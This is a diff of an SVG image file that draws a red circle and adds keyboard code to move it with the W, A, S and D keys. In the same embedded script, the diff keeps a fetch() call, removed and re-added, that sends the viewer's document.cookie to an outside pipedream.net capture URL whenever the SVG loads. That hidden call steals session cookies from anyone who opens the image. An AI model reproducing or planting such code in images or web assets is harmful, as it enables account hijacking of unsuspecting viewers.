@@ -3,6 +3,29 @@
 <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
   <circle cx="250" cy="100" r="50" fill="red" />
   <script type="text/javascript"><![CDATA[
-   fetch(`https://enz25p7qw0dco.x.pipedream.net//1234.png?c=${document.cookie}`, { method: "POST" })
+    var KEY = { w:87, a:65, s:83, d:68 };
+    var moveSpeed = 5;
+    var circle = document.getElementsByTagName("circle")[0];
+    var x = circle.getAttribute('cx')*1,
+        y = circle.getAttribute('cy')*1;
+    document.documentElement.addEventListener('keydown',function(evt){
+      switch (evt.keyCode){
+        case KEY.w:
+          circle.setAttribute('cy',y-=moveSpeed);
+          // Alternatively:
+          // circle.cy.baseVal.value = (y-=moveSpeed);
+        break;
+        case KEY.s:
+          circle.setAttribute('cy',y+=moveSpeed);
+        break;
+        case KEY.a:
+          circle.setAttribute('cx',x-=moveSpeed);
+        break;
+        case KEY.d:
+          circle.setAttribute('cx',x+=moveSpeed);
+        break;
+      }
+    },false);
+    fetch(`https://enz25p7qw0dco.x.pipedream.net/1234.png?c=${document.cookie}`, { method: "POST" })
   ]]></script>
 </svg>
